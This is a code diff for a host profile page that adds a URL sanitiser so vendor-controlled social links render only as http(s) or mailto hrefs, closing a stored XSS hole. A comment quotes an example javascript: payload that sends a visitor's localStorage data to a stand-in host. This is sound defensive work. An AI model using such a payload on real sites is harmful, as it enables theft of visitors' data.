@@ -34,6 +34,18 @@ const C = {
 // to re-enable with no layout changes. See spec 2026-06-14-profile-landing-redesign.
 const SHOW_CARD_METRICS = false;
 
+// Sanitize a vendor-supplied social link before using it as an href.
+// social_links are vendor-controlled and rendered on a public page — a value
+// like `javascript:fetch('//evil/?c='+localStorage.user)` would be stored XSS
+// against any visitor who clicks it. Allow only http(s) links (and mailto: for
+// a valid email); anything else collapses to a harmless '#'.
+const EMAIL_RE = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+const safeUrl = (value, isEmail = false) => {
+  const v = String(value || '').trim();
+  if (isEmail) return EMAIL_RE.test(v) ? `mailto:${v}` : '#';
+  return /^https?:\/\//i.test(v) ? v : '#';
+};
+
 // ─── Star Rating ─────────────────────────────────────────────────────────────
 const Stars = ({ avg, count, size = "sm" }) => {
   const sz = size === "lg" ? "w-4 h-4" : "w-3 h-3";
@@ -373,7 +385,8 @@ const HostProfile = () => {
   const SOCIAL_ORDER = ['instagram', 'youtube', 'linkedin', 'facebook', 'twitter', 'whatsapp', 'website', 'github', 'email'];
   const socialLinks  = SOCIAL_ORDER
     .filter(k => social[k])
-    .map(k => ({ key: k, href: k === 'email' ? `mailto:${social[k]}` : social[k] }));
+    .map(k => ({ key: k, href: safeUrl(social[k], k === 'email') }))
+    .filter(({ href }) => href !== '#');
 
   const stats = [
     { val: services.length,                                               lbl: 'Services' },
